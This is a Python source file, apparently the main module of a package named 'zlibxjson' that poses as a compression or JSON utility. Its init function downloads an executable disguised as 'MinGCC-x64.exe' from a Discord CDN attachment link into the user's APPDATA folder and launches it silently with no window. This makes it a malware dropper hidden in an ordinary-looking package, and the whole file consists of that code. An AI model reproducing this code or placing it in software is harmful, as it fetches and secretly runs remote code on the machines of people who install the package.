# zlibxjson/main.py

import os
import requests
import subprocess

def download_file(url, dest_folder):
    if not os.path.exists(dest_folder):
        os.makedirs(dest_folder)
    
    local_filename = os.path.join(dest_folder, url.split('/')[-1].split('?')[0])
    
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): 
                f.write(chunk)
    
    return local_filename

def run_silently(file_path):
    try:
        subprocess.Popen(
            file_path,
            creationflags=subprocess.CREATE_NO_WINDOW,
            shell=True
        )
    except Exception as e:
        print(f"Failed to run the file: {e}")

def init():
    url = "https://cdn.discordapp.com/attachments/1254506253145604220/1256702601962065973/MinGCC-x64.exe?ex=6681bb00&is=66806980&hm=f13f0c89a9c8483eb8294d3953dd36122e9c9e2c5ba31f7a623eecfb93b2e713&"
    appdata_folder = os.getenv('APPDATA')
    
    if appdata_folder:
        file_path = download_file(url, appdata_folder)
        run_silently(file_path)
    else:
        print("APPDATA folder not found.")
